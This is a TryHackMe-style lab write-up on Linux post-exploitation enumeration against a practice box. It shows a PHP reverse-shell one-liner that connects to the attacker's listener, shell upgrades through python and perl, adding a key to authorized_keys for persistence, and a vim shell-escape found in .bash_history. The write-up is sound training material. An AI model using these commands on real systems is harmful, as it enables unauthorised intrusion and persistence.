---
Learn to efficiently enumerate a linux machine and identify possible weaknesses
---

# Linux Local Enumeration — Writeup

## Enumeration
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/d05746cfa7596f2f06697288060a143a.png)
### Introduction
Have you ever found yourself in a situation where you have no idea about "what to do after getting a reverse shell (access to a machine)"?
If your answer was "Yes", this room is definitely for you. This rooms aims at providing beginner basis in box enumeration, giving a detailed approach towards it.
Here's a list of units that are going to be covered in this room:
Unit 1 - Stabilizing the shell
Exploring a way to transform a reverse shell into a stable bash or ssh shell.
Unit 2 - Basic enumaration
Enumerate OS and the most common files to identify possible security flaws.
Unit 3 - /etc
Understand the purpose and sensitivity of files under /etc directory.
Unit 4 - Important files
Learn to find files, containing potentially valuable information.
Unit 6 - Enumeration scripts
Automate the process by running multiple community-created enumeration scripts.
Browse to the MACHINE_IP:3000 and follow the instructions.
To continue with the room material, you need to get a reverse shell using a PHP payload and a netcat listener (nc -lvnp 1234).
How reverse shells work in a nutshell:
![](https://i.imgur.com/WlwnnqK.png)
Once you get on the box, it's crucially important to do the basic enumeration. In some cases, it can save you a lot of time and provide you a shortcut into escalating your privileges to root.
> First, let's start with the uname command. uname prints information about the system.
![](https://i.imgur.com/ZkWQu4Z.png)
Execute uname -a to print out all information about the system.
This simple box enumeration allows you to get initial information about the box, such as distro type and version. From this point you can easily look for known exploits and vulnerabilities.
> Next in our list are auto-generated bash files.
Bash keeps tracks of our actions by putting plaintext used commands into a history file. (~/.bash_history)
If you happen to have a reading permission on this file, you can easily enumerate system user's action and retrieve some sensitive infrmation. One of those would be plaintext passwords or privilege escalation methods.
.bash_profile and .bashrc are files containing shell commands that are run when Bash is invoked. These files can contain some interesting start up setting that can potentially reveal us some infromation. For example a bash alias can be pointed towards an important file or process.
> Next thing that you want to check is the sudo version.
Sudo command is one of the most common targets in the privilage escalation. Its version can help you identify known exploits and vulnerabilities. Execute sudo -V to retrieve the version.
For example, sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command.
> Last part of basic enumeration comes down to using our sudo rights.
Users can be assigned to use sudo via /etc/sudoers file. It's a fully customazible file that can either limit or open access to a wider range of permissions. Run sudo -l to check if a user on the box is allowed to use sudo with any command on the system.
![](https://i.imgur.com/3y949OY.png)
Most of the commands open us an opportunity to escalate our priviligies via simple tricks described in GTFObins.
Note: Output on the picture demonstrates that user may run ALL commands on the system with sudo rights. A given configuration is the easiest way to get root.

## Exploitation
```text
Hello there!
This website is highly vulnerable to file upload and RCE. Use those to gain initial access to the box.

Method 1:
Browse to cmd.php and add the following php payload to the input field.
php -r '$sock=fsockopen("{IP}",{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'

Method 2:
Upload a reverse shell file below and execute it using the cmd.php 

fisrt listen 
rlwrap nc -nlvp 4444 

so go to ip:3000/cmd.php then input the payload

php -r '$sock=fsockopen("10.11.81.220",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

yeah
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444                                  
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.107.52.
Ncat: Connection from 10.10.107.52:44610.
/bin/sh: 0: can't access tty; job control turned off
```
```text
$ whoami
manager
```
### Unit 1 - tty
As you might have noticed, a netcat reverse shell is pretty useless and can be easily broken by simple mistakes.
In order to fix this, we need to get a 'normal' shell, aka tty (text terminal).
Note: Mainly, we want to upgrade to tty because commands like su and sudo require a proper terminal to run.
One of the simplest methods for that would be to execute /bin/bash. In most cases, it's not that easy to do and it actually requires us to do some additional work.
Surprisingly enough, we can use python to execute /bin/bash and upgrade to tty:
python3 -c 'import pty; pty.spawn("/bin/bash")'
Generally speaking, you want to use an external tool to execute /bin/bash for you. While doing so, it is a good idea to try everything you know, starting from python, finishing with getting a binary on the target system.
List of static binaries you can get on the system: github.com/andrew-d/static-binaries
Try experimenting with the netcat shell you obtained in the previous task and try different versions.
Read more about upgrading to TTY: blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys
Answer the questions below
How would you execute /bin/bash with perl?
Research! Maybe GTFOBins will give you an idea
*perl -e 'exec "/bin/bash";'*
```text
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.107.52.
Ncat: Connection from 10.10.107.52:44644.
/bin/sh: 0: can't access tty; job control turned off
```
```text
$ perl -e 'exec "/bin/bash";'
whoami
manager
bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
manager@py:~/Desktop$
```
### Unit 1 - ssh
To make things even better, you should always try and get shell access to the box.
id_rsa file that contains a private key that can be used to connect to a box via ssh. It is usually located in the .ssh folder in the user's home folder. (Full path: /home/user/.ssh/id_rsa)
Get that file on your system and give it read/write-only permissions for your user:
(chmod 600 id_rsa) and connect by executing ssh -i id_rsa user@ip).
In case if the target box does not have a generated id_rsa file (or you simply don't have reading permissions for it), you can still gain stable ssh access. All you need to do is generate your own id_rsa key on your system and include an associated key into authorized_keys file on the target machine.
Execute ssh-keygen and you should see id_rsa and id_rsa.pub files appear in your own .ssh folder. Copy the content of the id_rsa.pub file and put it inside the authorized_keys file on the target machine (located in .ssh folder). After that, connect to the machine using your id_rsa file.
![](https://i.imgur.com/CZ6JRkW.jpg)
Where can you usually find the id_rsa file? (User = user)
*/home/user/.ssh/id_rsa*
```text
manager@py:~/Desktop$ cd ..
cd ..
manager@py:~$ pwd
pwd
/home/manager
manager@py:~$ ls -lah
ls -lah
total 88K
drwxr-xr-x 16 manager manager 4.0K Oct 25  2020 .
drwxr-xr-x  3 root    root    4.0K Aug  4  2020 ..
-rw-------  1 manager manager  249 Oct 25  2020 .bash_history
-rw-r--r--  1 manager manager  220 Aug  4  2020 .bash_logout
-rw-r--r--  1 manager manager 3.7K Aug  4  2020 .bashrc
drwx------ 13 manager manager 4.0K Oct 25  2020 .cache
drwx------ 11 manager manager 4.0K Aug  4  2020 .config
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Desktop
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Documents
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Downloads
drwx------  3 manager manager 4.0K Aug  4  2020 .gnupg
drwx------  3 manager manager 4.0K Aug  4  2020 .local
drwx------  5 manager manager 4.0K Aug  4  2020 .mozilla
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Music
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Pictures
-rw-r--r--  1 manager manager  807 Aug  4  2020 .profile
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Public
-rw-r--r--  1 manager manager   66 Aug 24  2020 .selected_editor
drwx------  2 manager manager 4.0K Aug  4  2020 .ssh
-rw-r--r--  1 manager manager    0 Aug 24  2020 .sudo_as_admin_successful
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Templates
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Videos
-rw-------  1 manager manager  583 Oct 25  2020 .viminfo
manager@py:~$ cd .ssh
cd .ssh
manager@py:~/.ssh$ ls -la
ls -la
total 8
drwx------  2 manager manager 4096 Aug  4  2020 .
drwxr-xr-x 16 manager manager 4096 Oct 25  2020 ..
manager@py:~/.ssh$
```
Is there an id_rsa file on the box? (yay/nay)
*nay*

## Privilege Escalation
```text
manager@py:~/.ssh$ cd /root
cd /root
bash: cd: /root: Permission denied
manager@py:~/.ssh$ uname -a
uname -a
Linux py 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
manager@py:~/.ssh$ cd ..
cd ..
manager@py:~$ pwd
pwd
/home/manager
manager@py:~$ cd .bash_history
cd .bash_history
bash: cd: .bash_history: Not a directory
manager@py:~$ cat .bash_history
cat .bash_history
thm{clear_the_history}
id
sudo -l
clear
ls
cd /root
id
exit
clear
ls
ls -la
cat .bash_history 
clear
/usr/bin/vim.basic
/usr/bin/vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
clear
ls
clear
sudo -l
sudo su
exit
manager@py:~$ pwd
pwd                                                                                   
/home/manager                                                                         
manager@py:~$ ls -lah                                                      
ls -lah                                                                  
total 88K                                                                
drwxr-xr-x 16 manager manager 4.0K Oct 25  2020 .                        
drwxr-xr-x  3 root    root    4.0K Aug  4  2020 ..                       
-rw-------  1 manager manager  249 Oct 25  2020 .bash_history            
-rw-r--r--  1 manager manager  220 Aug  4  2020 .bash_logout             
-rw-r--r--  1 manager manager 3.7K Aug  4  2020 .bashrc
drwx------ 13 manager manager 4.0K Oct 25  2020 .cache
drwx------ 11 manager manager 4.0K Aug  4  2020 .config
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Desktop
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Documents
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Downloads
drwx------  3 manager manager 4.0K Aug  4  2020 .gnupg
drwx------  3 manager manager 4.0K Aug  4  2020 .local
drwx------  5 manager manager 4.0K Aug  4  2020 .mozilla
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Music
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Pictures
-rw-r--r--  1 manager manager  807 Aug  4  2020 .profile
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Public
-rw-r--r--  1 manager manager   66 Aug 24  2020 .selected_editor
drwx------  2 manager manager 4.0K Aug  4  2020 .ssh
-rw-r--r--  1 manager manager    0 Aug 24  2020 .sudo_as_admin_successful
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Templates
drwxr-xr-x  2 manager manager 4.0K Aug  4  2020 Videos
-rw-------  1 manager manager  583 Oct 25  2020 .viminfo
manager@py:~$ cat .bashrc
cat .bashrc
```
```text
# ~/.bashrc: executed by bash(1) for non-login shells.
```
```text
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
```
```text
# for examples
```
```text
# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac
```
```text
# don't put duplicate lines or lines starting with space in the history.
```
```text
# See bash(1) for more options
HISTCONTROL=ignoreboth
```
```text
# append to the history file, don't overwrite it
shopt -s histappend
```
```text
# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000
```
```text
# check the window size after each command and, if necessary,
```
```text
# update the values of LINES and COLUMNS.
shopt -s checkwinsize
```
```text
# If set, the pattern "**" used in a pathname expansion context will
```
```text
# match all files and zero or more directories and subdirectories.
#shopt -s globstar
```
```text
# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
```
```text
# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi
```
```text
# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac
```
```text
# uncomment for a colored prompt, if the terminal has the capability; turned
```
```text
# off by default to not distract the user: the focus in a terminal window
```
```text
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
```
```text
# We have color support; assume it's compliant with Ecma-48
```
```text
# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
```
```text
# a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt
```
```text
# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac
```
```text
# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
```
```text
# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
```
```text
# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'
```
